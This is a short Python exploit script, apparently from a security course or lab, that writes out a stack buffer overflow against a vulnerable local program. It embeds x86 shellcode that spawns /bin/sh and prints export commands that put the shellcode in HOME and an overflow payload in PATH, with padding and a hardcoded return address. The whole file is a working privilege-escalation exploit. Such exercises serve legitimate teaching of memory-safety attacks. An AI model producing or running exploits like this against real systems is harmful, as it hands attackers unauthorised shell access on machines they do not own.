import os


SHELLCODE = b'\xeb#[S1\xc0\x041\xcd\x80S\x89\xc3\x89\xc11\xc0\x04F\xcd\x80[1\xd2\x89S\x071\xc0\x04\x0b1\xc91\xd2\xcd\x80\xe8\xd8\xff\xff\xff/bin/shA'

EBP_VALUE = 0xbffff718
SHELLCODE_ADDRESS = EBP_VALUE - 0x21c


def main():
    print(f'export SHELL=irrelevant')
    print(f'export USERNAME=irrelevant')

    print(f'export HOME=$(echo -ne "{str(SHELLCODE)[2:-1]}")')
    
    bytes_to_override = 0x9c + 4
    path_payload = b'a' * (bytes_to_override) + int.to_bytes(SHELLCODE_ADDRESS, 4, 'little')
    print(f'export PATH=$(echo -ne "{str(path_payload)[2:-1]}")')


if __name__ == '__main__':
    main()

